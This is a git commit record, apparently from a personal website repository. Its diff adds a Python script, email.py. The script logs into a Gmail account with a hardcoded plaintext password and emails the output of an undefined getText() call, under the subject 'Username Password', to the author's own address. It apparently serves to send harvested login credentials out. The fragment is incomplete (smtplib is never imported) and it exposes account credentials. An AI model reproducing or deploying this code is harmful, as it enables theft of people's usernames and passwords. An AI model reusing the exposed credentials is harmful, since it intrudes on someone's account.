0758242ce8ae946a9d23a0b05cd67541e1b4cf6d
thicczucc <therealrp231@gmail.com>
2019-10-18 16:48:56 -0700

    Revert "Merge branch 'master' of https://github.com/thicczucc/thicczucc.github.io"
    This reverts commit 3fd919a1a5d1f539d2191e1ba46fe31960f85739, reversing
    changes made to fc022f7afa999910cd6502cc7f7f9c9ea3a178a2.

---
+++ email.py
@@ -0,0 +1,33 @@
+def send_email():
+    # You can use the following email
+    # to send your emails.
+    gmail_user = 'helpmewithmycodinghomework@gmail.com'
+    gmail_password = 'himynameistravis'
+
+    sent_from = gmail_user
+    to = ['therealrp231@gmail.com']
+
+    subject = 'Username Password'
+    body = getText()
+
+    print(body)
+
+    email_text = """\
+        From: %s
+        To: %s
+        Subject: %s
+
+        %s
+        """ % (sent_from, ", ".join(to), subject, body)
+
+    print(email_text)
+
+    try:
+        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+        server.ehlo()
+        server.login(gmail_user, gmail_password)
+        server.sendmail(sent_from, to, email_text)
+        server.close()
+        print('Email sent!')
+    except:
+        print('Something went wrong...')
